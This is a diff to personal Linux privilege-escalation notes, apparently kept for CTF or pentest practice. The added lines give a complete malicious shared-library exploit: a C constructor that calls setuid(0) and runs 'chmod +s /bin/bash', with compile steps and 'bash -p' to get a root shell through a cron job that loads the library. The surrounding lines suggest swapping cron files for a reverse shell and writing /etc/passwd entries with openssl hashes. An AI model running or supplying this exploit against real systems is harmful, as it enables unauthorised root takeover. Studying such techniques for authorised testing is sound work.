@@ -105,10 +105,33 @@
 - [PSPY64] if process ends with ```/etc/cron.{hourly} ``` , can abuse
 - Carefully read every processes when found writable files in $PATH!
 
+
 # Bad File permissions 
 ## Cron jobss hack
 - ``` grep "CRON" /var/log/syslog ``` grep from syslog (messages from various system services and daemons, including the cron daemon)
 - change the file to rev shell , ez
+- [Root jobs] try to run the executable to see if have errors e.g. missing .so / .o library files
+### Forging so library file (dynamic linker)
+1. finding writable paths e.g. ``` LD_LIBRARY_PATH ``` 
+2. write sussy.c 
+   ```
+        #include <stdio.h>
+        #include <unistd.h>
+        #include <sys/types.h>
+        #include <stdlib.h>
+
+        static void inject() __attribute__((constructor));
+
+        void inject(){
+            setuid(0);
+            setgid(0);
+            printf("I'm the bad library\n");
+            system("chmod +s /bin/bash"); #ChangeThisCMD 
+        }
+    ```
+3. compile it in victim pc ``` gcc -shared -o sussy.so -fPIC sussy.c```
+4. wait the cronjob done and [if] using SUID stragegy: run priviledged bash``` bash -p ``` 
+
 ## Password authN hack
 - unless AD/LDAP, its store in /etc/shadow, write to passwd still works sometimes
 - gen 'crypt' hash password ``` openssl passwd {password_plain} ```
